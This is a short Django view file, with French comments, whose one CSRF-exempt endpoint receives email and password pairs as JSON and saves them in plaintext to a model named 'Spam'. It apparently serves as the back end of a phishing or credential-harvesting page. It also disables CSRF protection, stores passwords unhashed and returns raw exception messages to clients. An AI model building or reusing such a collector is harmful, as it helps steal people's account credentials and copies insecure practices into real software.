# save/views.py

from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Spam
import json

@csrf_exempt
def save_spam(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)


            email = data.get('email')
            password = data.get('password')

            # Vérifiez si l'email et le message sont fournis
            if not email or not password:
                return JsonResponse({'status': 'fail', 'error': 'Email and Pass are required'}, status=400)

            # Créer une nouvelle instance Spam et l'enregistrer
            spam = Spam(email=email, password=password)
            spam.save()

            return JsonResponse({'status': 'success', 'message': 'Spam saved successfully'})

        except json.JSONDecodeError:
            return JsonResponse({'status': 'fail', 'error': 'Invalid JSON'}, status=400)
        except Exception as e:
            return JsonResponse({'status': 'fail', 'error': str(e)}, status=500)

    return JsonResponse({'status': 'fail', 'error': 'Invalid request method'}, status=400)
